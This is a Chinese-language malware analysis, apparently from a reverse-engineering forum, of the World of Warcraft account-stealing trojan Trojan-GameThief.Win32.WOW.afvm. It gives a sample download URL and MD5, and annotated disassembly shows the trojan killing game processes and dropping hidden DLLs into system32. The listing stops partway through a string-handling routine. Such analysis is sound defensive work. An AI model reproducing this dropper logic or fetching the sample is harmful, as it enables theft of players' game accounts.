
# Trojan-GameThief.Win32.WOW.afvm 简要分析

> 原文：[`www.pediy.com/kssd/pediy12/138013.html`](https://www.pediy.com/kssd/pediy12/138013.html)

来源：`http://web3.fimmu.com/sifa/img/wow.exe`

MD5：`1075c31ad368e04dda4e6d167947cacd`

1. 枚举系统进程，检查 `BigFoot.exe` 是否运行。

代码：

```
004011A0  /$  81EC 28010000 sub     esp, 128
004011A6  |.  53          push    ebx
004011A7  |.  56          push    esi
004011A8  |.  57          push    edi
004011A9  |.  6A 00       push    0                   ; /ProcessID = 0
004011AB  |.  6A 02       push    2                   ; |Flags = TH32CS_SNAPPROCESS
004011AD  |.  E8 CA190000   call    <jmp.&KERNEL32.CreateToolhelp32S>; \创建系统进程快照
004011B2  |.  8BD8        mov     ebx, eax
004011B4  |.  B9 4A000000   mov     ecx, 4A
004011B9  |.  33C0        xor     eax, eax
004011BB  |.  8D7C24 0C   lea     edi, dword ptr [esp+C]
004011BF  |.  F3:AB       rep     stos dword ptr es:[edi]
004011C1  |.  8D4424 0C   lea     eax, dword ptr [esp+C]
004011C5  |.  C74424 0C 280>mov   dword ptr [esp+C], 128
004011CD  |.  50          push    eax                 ; /lppe
004011CE  |.  53          push    ebx                 ; |hSnapshot
004011CF  |.  E8 A2190000   call    <jmp.&KERNEL32.Process32First>   ; \获取快照中第一个进程句柄
004011D4  |.  85C0        test    eax, eax
004011D6  |.  74 28       je      short 00401200
004011D8  |.  8BB424 380100>mov   esi, dword ptr [esp+138]
004011DF  |.  8B3D 34304000 mov    edi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcmpiA
004011E5  |>  8D4C24 30   /lea      ecx, dword ptr [esp+30]
004011E9  |.  51          |push     ecx
004011EA  |.  56          |push     esi
004011EB  |.  FFD7        |call     edi               ;  将 BigFoot.exe 与进程名相比较
004011ED  |.  85C0        |test     eax, eax
004011EF  |.  74 22       |je       short 00401213            ;  检查到 BigFoot.exe 就跳
004011F1  |.  8D5424 0C   |lea      edx, dword ptr [esp+C]
004011F5  |.  52          |push     edx                 ; /lppe
004011F6  |.  53          |push     ebx                 ; |hSnapshot
004011F7  |.  E8 74190000   |call     <jmp.&KERNEL32.Process32Next>   ; \获取下一个进程句柄
004011FC  |.  85C0        |test     eax, eax
004011FE  |.^ 75 E5       \jnz      short 004011E5
00401200  |>  53          push    ebx                 ; /hObject
00401201  |.  FF15 00304000 call    dword ptr [<&KERNEL32.CloseHandl>; \结束
00401207  |.  5F          pop     edi
00401208  |.  5E          pop     esi
00401209  |.  33C0        xor     eax, eax
0040120B  |.  5B          pop     ebx
0040120C  |.  81C4 28010000 add     esp, 128
00401212  |.  C3          retn
00401213  |>  8B4424 14   mov     eax, dword ptr [esp+14]
00401217  |.  5F          pop     edi
00401218  |.  5E          pop     esi
00401219  |.  5B          pop     ebx
0040121A  |.  81C4 28010000 add     esp, 128
00401220  \\.  C3          retn
```

2. 若存在 `BigFoot.exe` 进程，则将其结束。

代码：

```
004028A4  |.  8B3D 90304000 mov     edi, dword ptr [<&KERNEL32.Termi>;  kernel32.TerminateProcess
004028AA  |.  8B2D 8C304000 mov     ebp, dword ptr [<&KERNEL32.OpenP>;  kernel32.OpenProcess
004028B0  |.  8BF0        mov     esi, eax
004028B2  |.  33DB        xor     ebx, ebx
004028B4  |.  83C4 04     add     esp, 4
004028B7  |.  3BF3        cmp     esi, ebx
004028B9  |.  76 15       jbe     short 004028D0            ;  若没有检测到 BigFoot.exe,则跳
004028BB  |.  68 D0070000   push    7D0                   ; /Timeout = 2000. ms
004028C0  |.  FF15 88304000 call    dword ptr [<&KERNEL32.Sleep>]    ; \睡眠 2000ms
004028C6  |.  53          push    ebx                 ; /ExitCode => 0
004028C7  |.  56          push    esi                 ; |/ProcessId
004028C8  |.  53          push    ebx                 ; ||Inheritable => FALSE
004028C9  |.  6A 01       push    1                   ; ||Access = TERMINATE
004028CB  |.  FFD5        call    ebp                 ; |\打开 BigFoot.exe 进程
004028CD  |.  50          push    eax                 ; |hProcess
004028CE  |.  FFD7        call    edi                 ; \结束 BigFoot.exe
```

3. 枚举系统进程，检查 `wow.exe` 是否运行。

代码：

```
004011A0  /$  81EC 28010000 sub     esp, 128
004011A6  |.  53          push    ebx
004011A7  |.  56          push    esi
004011A8  |.  57          push    edi
004011A9  |.  6A 00       push    0                   ; /ProcessID = 0
004011AB  |.  6A 02       push    2                   ; |Flags = TH32CS_SNAPPROCESS
004011AD  |.  E8 CA190000   call    <jmp.&KERNEL32.CreateToolhelp32S>; \创建系统进程快照
004011B2  |.  8BD8        mov     ebx, eax
004011B4  |.  B9 4A000000   mov     ecx, 4A
004011B9  |.  33C0        xor     eax, eax
004011BB  |.  8D7C24 0C   lea     edi, dword ptr [esp+C]
004011BF  |.  F3:AB       rep     stos dword ptr es:[edi]
004011C1  |.  8D4424 0C   lea     eax, dword ptr [esp+C]
004011C5  |.  C74424 0C 280>mov   dword ptr [esp+C], 128
004011CD  |.  50          push    eax                 ; /lppe
004011CE  |.  53          push    ebx                 ; |hSnapshot
004011CF  |.  E8 A2190000   call    <jmp.&KERNEL32.Process32First>   ; \获取快照中第一个进程句柄
004011D4  |.  85C0        test    eax, eax
004011D6  |.  74 28       je      short 00401200
004011D8  |.  8BB424 380100>mov   esi, dword ptr [esp+138]
004011DF  |.  8B3D 34304000 mov    edi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcmpiA
004011E5  |>  8D4C24 30   /lea      ecx, dword ptr [esp+30]
004011E9  |.  51          |push     ecx
004011EA  |.  56          |push     esi
004011EB  |.  FFD7        |call     edi               ;  将 wow.exe 与进程名相比较
004011ED  |.  85C0        |test     eax, eax
004011EF  |.  74 22       |je       short 00401213            ;  检查到 wow.exe 就跳
004011F1  |.  8D5424 0C   |lea      edx, dword ptr [esp+C]
004011F5  |.  52          |push     edx                 ; /lppe
004011F6  |.  53          |push     ebx                 ; |hSnapshot
004011F7  |.  E8 74190000   |call     <jmp.&KERNEL32.Process32Next>   ; \获取下一个进程句柄
004011FC  |.  85C0        |test     eax, eax
004011FE  |.^ 75 E5       \jnz      short 004011E5
00401200  |>  53          push    ebx                 ; /hObject
00401201  |.  FF15 00304000 call    dword ptr [<&KERNEL32.CloseHandl>; \结束
00401207  |.  5F          pop     edi
00401208  |.  5E          pop     esi
00401209  |.  33C0        xor     eax, eax
0040120B  |.  5B          pop     ebx
0040120C  |.  81C4 28010000 add     esp, 128
00401212  |.  C3          retn
00401213  |>  8B4424 14   mov     eax, dword ptr [esp+14]
00401217  |.  5F          pop     edi
00401218  |.  5E          pop     esi
00401219  |.  5B          pop     ebx
0040121A  |.  81C4 28010000 add     esp, 128
00401220  \\.  C3          retn
```

4. 若检测到 `wow.exe` 进程，则将其结束。

代码：



```
004028E3  |.  68 88130000   push    1388                            ; /Timeout = 5000. ms
004028E8  |.  FF15 88304000 call    dword ptr [<&KERNEL32.Sleep>]    ; \暂停 5000ms
004028EE  |>  53            /push    ebx
004028EF  |.  56            |push    esi
004028F0  |.  53            |push    ebx
004028F1  |.  6A 01         |push    1
004028F3  |.  FFD5          |call    ebp                             ;  打开进程
004028F5  |.  50            |push    eax
004028F6  |.  FFD7          |call    edi                             ;  结束 wow.exe
004028F8  |.  68 78414000   |push    00404178                        ;  ASCII "wow.exe"
004028FD  |.  E8 9EE8FFFF   |call    004011A0
00402902  |.  8BF0          |mov     esi, eax
00402904  |.  83C4 04       |add     esp, 4
00402907  |.  3BF3          |cmp     esi, ebx
00402909  |.^ 77 E3         \ja      short 004028EE
```

5. 将 `%windir%\system32\1016.ocx` 移动到 `%temp%`，重命名为 `开机时间+wuozwtmp.dat`。

代码：

```
0040290B  |> \68 B80B0000   push    0BB8                            ; /Timeout = 3000. ms
00402910  |.  FF15 88304000 call    dword ptr [<&KERNEL32.Sleep>]    ; \睡眠 3000ms
00402916  |.  8B2D 7C304000 mov     ebp, dword ptr [<&KERNEL32.GetSy>;  kernel32.GetSystemDirectoryA
0040291C  |.  8D8424 340400> lea    eax, dword ptr [esp+434]
00402923  |.  68 04010000   push    104                              ; /BufSize = 104 (260.)
00402928  |.  50            push    eax                                ; |Buffer
00402929  |.  FFD5          call    ebp                               ; \检索系统文件夹路径
0040292B  |.  8B35 4C304000 mov     esi, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcatA
00402931  |.  8D8C24 340400> lea    ecx, dword ptr [esp+434]
00402938  |.  68 6C414000   push    0040416C                         ; /StringToAdd = "\1016.ocx"
0040293D  |.  51            push    ecx                                ; |ConcatString
0040293E  |.  FFD6          call    esi                               ; \连接字符%windir%\system32\1016.ocx
00402940  |.  FF15 78304000 call    dword ptr [<&KERNEL32.GetTickCou>; [返回系统开机时间
00402946  |.  33D2          xor     edx, edx
00402948  |.  05 00000001   add     eax, 1000000
0040294D  |.  895424 11     mov     dword ptr [esp+11], edx
00402951  |.  50            push    eax                                ; /<%x>
00402952  |.  895424 19     mov     dword ptr [esp+19], edx          ; |
00402956  |.  8D4424 14     lea     eax, dword ptr [esp+14]           ; |
0040295A  |.  895424 1D     mov     dword ptr [esp+1D], edx          ; |
0040295E  |.  68 68414000   push    00404168                         ; |format = "%x"
00402963  |.  895424 25     mov     dword ptr [esp+25], edx          ; |
00402967  |.  50            push    eax                                ; |s
00402968  |.  66:895424 2D  mov     word ptr [esp+2D], dx            ; |
0040296D  |.  885C24 1C     mov     byte ptr [esp+1C], bl            ; |
00402971  |.  885424 2F     mov     byte ptr [esp+2F], dl            ; |
00402975  |.  FF15 A0304000 call    dword ptr [<&MSVCRT.sprintf>]    ; \输出系统开机时间
0040297B  |.  83C4 0C       add     esp, 0C
0040297E  |.  8D4C24 10     lea     ecx, dword ptr [esp+10]
00402982  |.  68 58414000   push    00404158                         ;  ASCII "wuozwtmp.dat"
00402987  |.  51            push    ecx
00402988  |.  FFD6          call    esi                               ;  连接字符 开机时间+wuozwtmp.dat
0040298A  |.  B9 40000000   mov     ecx, 40
0040298F  |.  33C0          xor     eax, eax
00402991  |.  8D7C24 25     lea     edi, dword ptr [esp+25]
00402995  |.  885C24 24     mov     byte ptr [esp+24], bl
00402999  |.  F3:AB         rep     stos dword ptr es:[edi]
0040299B  |.  66:AB         stos    word ptr es:[edi]
0040299D  |.  8D5424 24     lea     edx, dword ptr [esp+24]
004029A1  |.  52            push    edx                                ; /Buffer
004029A2  |.  68 04010000   push    104                              ; |BufSize = 104 (260.)
004029A7  |.  AA            stos    byte ptr es:[edi]                  ; |
004029A8  |.  FF15 50304000 call    dword ptr [<&KERNEL32.GetTempPat>; \检索系统临时目录
004029AE  |.  8D4424 10     lea     eax, dword ptr [esp+10]
004029B2  |.  8D4C24 24     lea     ecx, dword ptr [esp+24]
004029B6  |.  50            push    eax
004029B7  |.  51            push    ecx
004029B8  |.  FFD6          call    esi                               ;  将%temp%与开机时间+wuozwtmp.dat 连接
004029BA  |.  8D5424 24     lea     edx, dword ptr [esp+24]
004029BE  |.  6A 01         push    1                                  ; /Flags = REPLACE_EXISTING
004029C0  |.  8D8424 380400> lea    eax, dword ptr [esp+438]           ; |
004029C7  |.  52            push    edx                                ; |NewName
004029C8  |.  50            push    eax                                ; |ExistingName
004029C9  |.  FF15 74304000 call    dword ptr [<&KERNEL32.MoveFileEx>; \将%windir%\1016.ocx 移动到临时目录
```

6. 创建文件 `%windir%\system32\1016.ocx`

代码：



```asm
00401000   /$  51                push    ecx
00401001   |.  53                push    ebx
00401002   |.  55                push    ebp
00401003   |.  56                push    esi
00401004   |.  57                push    edi
00401005   |.  6A 00             push    0                             ; /pModule = NULL
00401007   |.  FF15 20304000     call    dword ptr [&KERNEL32.GetModuleH]; \返回自身句柄
0040100D   |.  8BF0              mov     esi, eax
0040100F   |.  8B4424 18         mov     eax, dword ptr [esp+18]
00401013   |.  25 FFFF0000       and     eax, 0FFFF
00401018   |.  68 00404000       push    00404000                      ; /ResourceType = "DLL"
0040101D   |.  50                push    eax                           ; |ResourceName
0040101E   |.  56                push    esi                           ; |hModule
0040101F   |.  FF15 1C304000     call    dword ptr [&KERNEL32.FindResour]; \查找 0x6C 号的 DLL 资源
00401025   |.  8BF8              mov     edi, eax
00401027   |.  85FF              test    edi, edi
00401029   |.  75 06             jnz     short 00401031                ;  成功则继续
0040102B   |.  5F                pop     edi
0040102C   |.  5E                pop     esi
0040102D   |.  5D                pop     ebp
0040102E   |.  5B                pop     ebx
0040102F   |.  59                pop     ecx
00401030   |.  C3                retn
00401031   |>  57                push    edi                           ; /hResource
00401032   |.  56                push    esi                           ; |hModule
00401033   |.  FF15 18304000     call    dword ptr [&KERNEL32.LoadResour]; \调取资源
00401039   |.  85C0              test    eax, eax
0040103B   |.  75 06             jnz     short 00401043                ;  成功则继续
0040103D   |.  5F                pop     edi
0040103E   |.  5E                pop     esi
0040103F   |.  5D                pop     ebp
00401040   |.  5B                pop     ebx
00401041   |.  59                pop     ecx
00401042   |.  C3                retn
00401043   |>  50                push    eax                           ; /nHandles
00401044   |.  FF15 14304000     call    dword ptr [&KERNEL32.LockResour]; \设置当前内存地址为 4050C0
0040104A   |.  8BE8              mov     ebp, eax
0040104C   |.  85ED              test    ebp, ebp
0040104E   |.  75 06             jnz     short 00401056                ;  成功则继续
00401050   |.  5F                pop     edi
00401051   |.  5E                pop     esi
00401052   |.  5D                pop     ebp
00401053   |.  5B                pop     ebx
00401054   |.  59                pop     ecx
00401055   |.  C3                retn
00401056   |>  57                push    edi                           ; /hResource
00401057   |.  56                push    esi                           ; |hModule
00401058   |.  FF15 10304000     call    dword ptr [&KERNEL32.SizeofReso]; \返回资源大小
0040105E   |.  8B7C24 1C         mov     edi, dword ptr [esp+1C]
00401062   |.  6A 00             push    0                             ; /FileAttributes = 0
00401064   |.  57                push    edi                           ; |FileName
00401065   |.  8BD8              mov     ebx, eax                     ; |
00401067   |.  FF15 0C304000     call    dword ptr [&KERNEL32.SetFileAtt]; \设置文件属性
0040106D   |.  6A 00             push    0                             ; /hTemplateFile = NULL
0040106F   |.  6A 00             push    0                             ; |Attributes = 0
00401071   |.  6A 02             push    2                             ; |Mode = CREATE_ALWAYS
00401073   |.  6A 00             push    0                             ; |pSecurity = NULL
00401075   |.  6A 03             push    3                             ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
00401077   |.  68 00000040       push    40000000                      ; |Access = GENERIC_WRITE
0040107C   |.  57                push    edi                           ; |FileName
0040107D   |.  FF15 08304000     call    dword ptr [&KERNEL32.CreateFile]; \创建%windir%\system\1016.ocx
00401083   |.  8BF0              mov     esi, eax
00401085   |.  83FE FF           cmp     esi, -1
00401088   |.  75 08             jnz     short 00401092                ;  成功则继续
0040108A   |.  5F                pop     edi
0040108B   |.  5E                pop     esi
0040108C   |.  5D                pop     ebp
0040108D   |.  33C0              xor     eax, eax
0040108F   |.  5B                pop     ebx
00401090   |.  59                pop     ecx
00401091   |.  C3                retn
00401092   |>  8D4C24 10         lea     ecx, dword ptr [esp+10]
00401096   |.  6A 00             push    0                             ; /pOverlapped = NULL
00401098   |.  51                push    ecx                           ; |pBytesWritten
00401099   |.  53                push    ebx                           ; |nBytesToWrite
0040109A   |.  55                push    ebp                           ; |/nHandles
0040109B   |.  FF15 14304000     call    dword ptr [&KERNEL32.LockResour]; | \SetHandleCount
004010A1   |.  50                push    eax                           ; |Buffer
004010A2   |.  56                push    esi                           ; |hFile
004010A3   |.  FF15 04304000     call    dword ptr [&KERNEL32.WriteFile]; \将 virus.004050C0 处的 0x1600 字节的数据写入 1016.ocx
004010A9   |.  85C0              test    eax, eax
004010AB   |.  75 06             jnz     short 004010B3                ;  成功则继续
004010AD   |.  5F                pop     edi
004010AE   |.  5E                pop     esi
004010AF   |.  5D                pop     ebp
004010B0   |.  5B                pop     ebx
004010B1   |.  59                pop     ecx
004010B2   |.  C3                retn
004010B3   |>  56                push    esi                           ; /hObject
004010B4   |.  FF15 00304000     call    dword ptr [&KERNEL32.CloseHandl]; \关闭句柄
004010BA   |.  6A 06             push    6                             ; /FileAttributes = HIDDEN|SYSTEM
004010BC   |.  57                push    edi                           ; |FileName
004010BD   |.  FF15 0C304000     call    dword ptr [&KERNEL32.SetFileAtt]; \设置隐藏,系统属性
004010C3   |.  5F                pop     edi
004010C4   |.  5E                pop     esi
004010C5   |.  5D                pop     ebp
004010C6   |.  B8 01000000       mov     eax, 1
004010CB   |.  5B                pop     ebx
004010CC   |.  59                pop     ecx
004010CD   \.  C3                retn
```

7. 创建文件 `%windir%\system32\WinWcolw.ocx`

代码：

```asm
004029E9   |.  68 48414000       push    00404148                      ; /String2 = "WinWcolw.ocx"
004029EE   |.  68 94414000       push    00404194                      ; |String1 = virus.00404194
004029F3   |.  FF15 44304000     call    dword ptr [&KERNEL32.lstrcpyA] ; \复制 WinWcolw.ocx 到缓冲区
004029F9   |.  B9 00010000       mov     ecx, 100
004029FE   |.  33C0              xor     eax, eax
00402A00   |.  8DBC24 340400>    lea     edi, dword ptr [esp+434]
00402A07   |.  8D9424 340400>    lea     edx, dword ptr [esp+434]
00402A0E   |.  68 04010000       push    104
00402A13   |.  52                push    edx
00402A14   |.  F3:AB             rep     stos dword ptr es:[edi]
00402A16   |.  FFD5              call    ebp                           ;  检索系统文件夹路径
00402A18   |.  8D8424 340400>    lea     eax, dword ptr [esp+434]
00402A1F   |.  68 90404000       push    00404090
00402A24   |.  50                push    eax
00402A25   |.  FFD6              call    esi                           ;  连接字符%windir%\system32\
00402A27   |.  8D8C24 340400>    lea     ecx, dword ptr [esp+434]
00402A2E   |.  68 94414000       push    00404194                      ;  ASCII "WinWcolw.ocx"
00402A33   |.  51                push    ecx
00402A34   |.  FFD6              call    esi                           ;  连接字符%windir%\system32\WinWcolw.ocx
00402A36   |.  8D9424 340400>    lea     edx, dword ptr [esp+434]
00402A3D   |.  52                push    edx
00402A3E   |.  6A 6A             push    6A
00402A40   |.  E8 BBE5FFFF       call    00401000
```

代码：



```
00401000   /$   51                    push    ecx
00401001   |.   53                    push    ebx
00401002   |.   55                    push    ebp
00401003   |.   56                    push    esi
00401004   |.   57                    push    edi
00401005   |.   6A 00                 push    0                            ; /pModule = NULL
00401007   |.   FF15 20304000 call    dword ptr [<&KERNEL32.GetModuleH>; \\返回自身句柄
0040100D   |.   8BF0                  mov     esi, eax
0040100F   |.   8B4424 18      mov     eax, dword ptr [esp+18]
00401013   |.   25 FFFF0000   and     eax, 0FFFF
00401018   |.   68 00404000   push    00404000                           ; /ResourceType = "DLL"
0040101D   |.   50                    push    eax                          ; |ResourceName
0040101E   |.   56                    push    esi                          ; |hModule
0040101F   |.   FF15 1C304000 call    dword ptr [<&KERNEL32.FindResour>; \\查找 0x6A 号 DLL 资源
00401025   |.   8BF8                  mov     edi, eax
00401027   |.   85FF                  test    edi, edi
00401029   |.   75 06                 jnz     short 00401031                ;  成功则继续
0040102B   |.   5F                    pop     edi
0040102C   |.   5E                    pop     esi
0040102D   |.   5D                    pop     ebp
0040102E   |.   5B                    pop     ebx
0040102F   |.   59                    pop     ecx
00401030   |.   C3                    retn
00401031   |>   57                    push    edi                          ; /hResource
00401032   |.   56                    push    esi                          ; |hModule
00401033   |.   FF15 18304000 call    dword ptr [<&KERNEL32.LoadResour>; \\装载资源
00401039   |.   85C0                  test    eax, eax
0040103B   |.   75 06                 jnz     short 00401043                ;  成功则继续
0040103D   |.   5F                    pop     edi
0040103E   |.   5E                    pop     esi
0040103F   |.   5D                    pop     ebp
00401040   |.   5B                    pop     ebx
00401041   |.   59                    pop     ecx
00401042   |.   C3                    retn
00401043   |>   50                    push    eax                          ; /nHandles
00401044   |.   FF15 14304000 call    dword ptr [<&KERNEL32.LockResour>; \\设置当前内存地址为 4066C0
0040104A   |.   8BE8                  mov     ebp, eax
0040104C   |.   85ED                  test    ebp, ebp
0040104E   |.   75 06                 jnz     short 00401056                ;  成功则继续
00401050   |.   5F                    pop     edi
00401051   |.   5E                    pop     esi
00401052   |.   5D                    pop     ebp
00401053   |.   5B                    pop     ebx
00401054   |.   59                    pop     ecx
00401055   |.   C3                    retn
00401056   |>   57                    push    edi                          ; /hResource
00401057   |.   56                    push    esi                          ; |hModule
00401058   |.   FF15 10304000 call    dword ptr [<&KERNEL32.SizeofReso>; \\返回资源大小
0040105E   |.   8B7C24 1C      mov     edi, dword ptr [esp+1C]
00401062   |.   6A 00                 push    0                            ; /FileAttributes = 0
00401064   |.   57                    push    edi                          ; |FileName
00401065   |.   8BD8                  mov     ebx, eax                     ; |
00401067   |.   FF15 0C304000 call    dword ptr [<&KERNEL32.SetFileAtt>; \\设置文件属性
0040106D   |.   6A 00                 push    0                            ; /hTemplateFile = NULL
0040106F   |.   6A 00                 push    0                            ; |Attributes = 0
00401071   |.   6A 02                 push    2                            ; |Mode = CREATE\_ALWAYS
00401073   |.   6A 00                 push    0                            ; |pSecurity = NULL
00401075   |.   6A 03                 push    3                            ; |ShareMode = FILE\_SHARE\_READ|FILE\_SHARE\_WRITE
00401077   |.   68 00000040   push    40000000                           ; |Access = GENERIC\_WRITE
0040107C   |.   57                    push    edi                          ; |FileName
0040107D   |.   FF15 08304000 call    dword ptr [<&KERNEL32.CreateFile>; \\创建文件%windir%\\system32\\WinWcolw.ocx
00401083   |.   8BF0                  mov     esi, eax
00401085   |.   83FE FF      cmp     esi, -1
00401088   |.   75 08                 jnz     short 00401092                ;  成功则继续
0040108A   |.   5F                    pop     edi
0040108B   |.   5E                    pop     esi
0040108C   |.   5D                    pop     ebp
0040108D   |.   33C0                  xor     eax, eax
0040108F   |.   5B                    pop     ebx
00401090   |.   59                    pop     ecx
00401091   |.   C3                    retn
00401092   |>   8D4C24 10      lea     ecx, dword ptr [esp+10]
00401096   |.   6A 00                 push    0                            ; /pOverlapped = NULL
00401098   |.   51                    push    ecx                          ; |pBytesWritten
00401099   |.   53                    push    ebx                          ; |nBytesToWrite
0040109A   |.   55                    push    ebp                          ; |/nHandles
0040109B   |.   FF15 14304000 call    dword ptr [<&KERNEL32.LockResour>; |\\SetHandleCount
004010A1   |.   50                    push    eax                          ; |Buffer
004010A2   |.   56                    push    esi                          ; |hFile
004010A3   |.   FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \\将 virus.004066C0 处的 0xDA00 字节的数据写入 WinWcolw.ocx
004010A9   |.   85C0                  test    eax, eax
004010AB   |.   75 06                 jnz     short 004010B3                ;  成功则继续
004010AD   |.   5F                    pop     edi
004010AE   |.   5E                    pop     esi
004010AF   |.   5D                    pop     ebp
004010B0   |.   5B                    pop     ebx
004010B1   |.   59                    pop     ecx
004010B2   |.   C3                    retn
004010B3   |>   56                    push    esi                          ; /hObject
004010B4   |.   FF15 00304000 call    dword ptr [<&KERNEL32.CloseHandl>; \\关闭句柄
004010BA   |.   6A 06                 push    6                            ; /FileAttributes = HIDDEN|SYSTEM
004010BC   |.   57                    push    edi                          ; |FileName
004010BD   |.   FF15 0C304000 call    dword ptr [<&KERNEL32.SetFileAtt>; \\设置隐藏,系统属性
004010C3   |.   5F                    pop     edi
004010C4   |.   5E                    pop     esi
004010C5   |.   5D                    pop     ebp
004010C6   |.   B8 01000000   mov     eax, 1
004010CB   |.   5B                    pop     ebx
004010CC   |.   59                    pop     ecx
004010CD   \\.  C3                    retn
```

8. 将病毒自身倒数 `0x4FA` 字节到 `virus.0012ED84` 的数据写入到 `%windir%\\system32\\WinWcolw.ocx`

代码:



```
004010D0  /$  81EC 04060000 sub     esp, 604
004010D6  |.  8D4424 04     lea     eax, dword ptr [esp+4]
004010DA  |.  55            push    ebp
004010DB  |.  56            push    esi
004010DC  |.  57            push    edi
004010DD  |.  68 04010000   push    104                            ; /BufSize = 104 (260.)
004010E2  |.  50            push    eax                            ; |PathBuffer
004010E3  |.  6A 00         push    0                              ; |hModule = NULL
004010E5  |.  FF15 2C304000 call    dword ptr [<&KERNEL32.GetModuleF]; \返回自身所在路径
004010EB  |.  8B35 08304000 mov     esi, dword ptr [<&KERNEL32.Creat>;   kernel32.CreateFileA
004010F1  |.  6A 00         push    0                              ; /hTemplateFile = NULL
004010F3  |.  6A 00         push    0                              ; |Attributes = 0
004010F5  |.  6A 03         push    3                              ; |Mode = OPEN_EXISTING
004010F7  |.  6A 00         push    0                              ; |pSecurity = NULL
004010F9  |.  6A 03         push    3                              ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
004010FB  |.  8D4C24 24     lea     ecx, dword ptr [esp+24]          ; |
004010FF  |.  68 00000080   push    80000000                       ; |Access = GENERIC_READ
00401104  |.  51            push    ecx                            ; |FileName
00401105  |.  FFD6          call    esi                            ; \打开病毒原程序
00401107  |.  8B2D 00304000 mov     ebp, dword ptr [<&KERNEL32.Close>;   kernel32.CloseHandle
0040110D  |.  8BF8          mov     edi, eax
0040110F  |.  83FF FF       cmp     edi, -1
00401112  |.  74 79         je      short 0040118D                   ;   不成功则跳
00401114  |.  53            push    ebx
00401115  |.  8B1D 28304000 mov     ebx, dword ptr [<&KERNEL32.SetFi>;   kernel32.SetFilePointer
0040111B  |.  6A 02         push    2                              ; /Origin = FILE_END
0040111D  |.  6A 00         push    0                              ; |pOffsetHi = NULL
0040111F  |.  68 06FBFFFF   push    -4FA                           ; |OffsetLo = FFFFBB06 (-1274.)
00401124  |.  57            push    edi                            ; |hFile
00401125  |.  FFD3          call    ebx                            ; \指针移至文件末尾倒数 0x4FA 字节处
00401127  |.  8D5424 10     lea     edx, dword ptr [esp+10]
0040112B  |.  6A 00         push    0                              ; /pOverlapped = NULL
0040112D  |.  52            push    edx                            ; |pBytesRead
0040112E  |.  8D8424 200100>lea     eax, dword ptr [esp+120]          ; |
00401135  |.  68 FA040000   push    4FA                            ; |BytesToRead = 4FA (1274.)
0040113A  |.  50            push    eax                            ; |Buffer
0040113B  |.  57            push    edi                            ; |hFile
0040113C  |.  FF15 24304000 call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从 0x4FA 到 virus.0012ED84 的数据
00401142  |.  8B8C24 180600>mov     ecx, dword ptr [esp+618]
00401149  |.  6A 00         push    0                              ; /hTemplateFile = NULL
0040114B  |.  6A 00         push    0                              ; |Attributes = 0
0040114D  |.  6A 03         push    3                              ; |Mode = OPEN_EXISTING
0040114F  |.  6A 00         push    0                              ; |pSecurity = NULL
00401151  |.  6A 03         push    3                              ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
00401153  |.  68 000000C0   push    C0000000                       ; |Access = GENERIC_READ|GENERIC_WRITE
00401158  |.  51            push    ecx                            ; |FileName
00401159  |.  FFD6          call    esi                            ; \打开%windir%\system32\WinWcolw.ocx
0040115B  |.  8BF0          mov     esi, eax
0040115D  |.  83FE FF       cmp     esi, -1
00401160  |.  74 27         je      short 00401189                   ;   成功则继续
00401162  |.  6A 02         push    2                              ; /Origin = FILE_END
00401164  |.  6A 00         push    0                              ; |pOffsetHi = NULL
00401166  |.  68 FA040000   push    4FA                            ; |OffsetLo = 4FA (1274.)
0040116B  |.  56            push    esi                            ; |hFile
0040116C  |.  FFD3          call    ebx                            ; \指针移至文件倒数 0x4FA 字节处
0040116E  |.  8D5424 10     lea     edx, dword ptr [esp+10]
00401172  |.  6A 00         push    0                              ; /pOverlapped = NULL
00401174  |.  52            push    edx                            ; |pBytesWritten
00401175  |.  8D8424 200100>lea     eax, dword ptr [esp+120]          ; |
0040117C  |.  68 FA040000   push    4FA                            ; |nBytesToWrite = 4FA (1274.)
00401181  |.  50            push    eax                            ; |Buffer
00401182  |.  56            push    esi                            ; |hFile
00401183  |.  FF15 04304000 call    dword ptr [<&KERNEL32.WriteFile>>; \写入数据
00401189  |>  56            push    esi
0040118A  |.  FFD5          call    ebp                            ;   关闭句柄
0040118C  |.  5B            pop     ebx
0040118D  |>  57            push    edi
0040118E  |.  FFD5          call    ebp                            ;   关闭句柄
00401190  |.  5F            pop     edi
00401191  |.  5E            pop     esi
00401192  |.  5D            pop     ebp
00401193  |.  81C4 04060000 add     esp, 604
00401199  \.  C3            retn
```

### 9. 处理字符串

代码:



```
00401C10   /$   83EC 7C       sub     esp, 7C
00401C13   |.   53           push    ebx
00401C14   |.   55           push    ebp
00401C15   |.   56           push    esi
00401C16   |.   57           push    edi
00401C17   |.   B9 1E000000   mov     ecx, 1E
00401C1C   |.   33C0          xor     eax, eax
00401C1E   |.   8D7C24 11     lea     edi, dword ptr [esp+11]
00401C22   |.   C64424 10 00  mov     byte ptr [esp+10], 0
00401C27   |.   F3:AB        rep     stos dword ptr es:[edi]
00401C29   |.   8B2D 7C304000 mov     ebp, dword ptr [<&KERNEL32.GetSy>;  kernel32.GetSystemDirectoryA
00401C2F   |.   6A 7B        push    7B                       ; /BufSize = 7B (123.)
00401C31   |.   66:AB       stos    word ptr es:[edi]          ; |
00401C33   |.   8D4424 14    lea     eax, dword ptr [esp+14]    ; |
00401C37   |.   50           push    eax                      ; |Buffer
00401C38   |.   FFD5         call    ebp                      ; \\检索系统文件夹路径
00401C3A   |.   BF 90404000   mov     edi, 00404090
00401C3F   |.   83C9 FF      or      ecx, FFFFFFFF
00401C42   |.   33C0          xor     eax, eax
00401C44   |.   8D5424 10     lea     edx, dword ptr [esp+10]
00401C48   |.   F2:AE        repne   scas byte ptr es:[edi]
00401C4A   |.   F7D1         not     ecx
00401C4C   |.   2BF9         sub     edi, ecx
00401C4E   |.   50           push    eax                      ; /hTemplateFile => NULL
00401C4F   |.   8BF7         mov     esi, edi                 ; |
00401C51   |.   8BD9         mov     ebx, ecx                 ; |
00401C53   |.   8BFA         mov     edi, edx                 ; |
00401C55   |.   83C9 FF      or      ecx, FFFFFFFF            ; |
00401C58   |.   F2:AE        repne   scas byte ptr es:[edi]    ; |
00401C5A   |.   8BCB         mov     ecx, ebx                 ; |
